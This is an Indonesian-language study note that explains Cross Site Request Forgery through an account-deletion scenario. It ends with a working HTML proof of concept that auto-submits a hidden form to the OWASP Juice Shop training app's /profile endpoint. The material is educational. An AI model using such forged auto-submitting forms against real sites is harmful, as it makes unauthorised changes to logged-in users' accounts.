---
cssclasses:
  - h1-center
  - indent
tags:
  - "#webdeveloper"
Tanggal: 2025-01-07
---
# **Cross Site Request Forgery (CSRF)**
---

> [!tip]- Sumber
> - [[Cookie]]

### WTF is Cross Site Request Forgery (CSRF)?

CSRF atau yang disebut juga Cross Site Request Forgery adalah salah satu jenis serangan pada keamanan web yang memanfaatkan session yang tersimpan di dalam file cookie's dari pengguna yang sudah ter-autentikasi. 

![[Pasted image 20250108004054.png|600]]Bisa dilihat dari nama nya serangan ini akan memungkinkan si penyerang mengirimkan request yang tidak diinginkan atas nama pengguna yang sedang login pada sebuah website tanpa sepengetahuan pengguna tersebut.

Dampak dari serangan ini bisanya seperti:
- Transfer uang tanpa izin
- Penghapusan akun
- Perubahan penngaturan akun (username, email, password)
- dll

### Bagaimana Cross Site Request Forgery (CSRF) ini bekerja?

> [!info] Baca ini
> [[Cookie#How it works]]

> [!important] Studi Kasus
> Website: example.com
> Action: Penghapusan akun

1. Ketika kita masuk dan login ke dalam website maka server akan mengesahkan pengguna dan akan menyimpan session authentikasi tersebut di dalam file cookie. Ini yang nantinya akan digunakan oleh penyerang untuk melakukan CSFR.
2. Kemudian penyerang akan membuat sebuah website ataupun link palsu yang akan digunakan untuk mengirimkan sebuah delete request kepada endpoint server example.com yang akan menghapus akun pengguna tanpa disadari.
3. Karena terdapat file cookie yang menyimpan session autentikasi pengguna maka request tersebut akan dianggap sah dan akun akan terhapus

![[Pasted image 20250108013258.png|500]]
### Example
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="https://juice-shop.herokuapp.com/profile" method="post">
        <input type="hidden" name="username" value="GG COYYY">
    </form>
</body>
<script>
    history.pushState('', '', '/');
    document.forms[0].submit();
</script>
</html>
```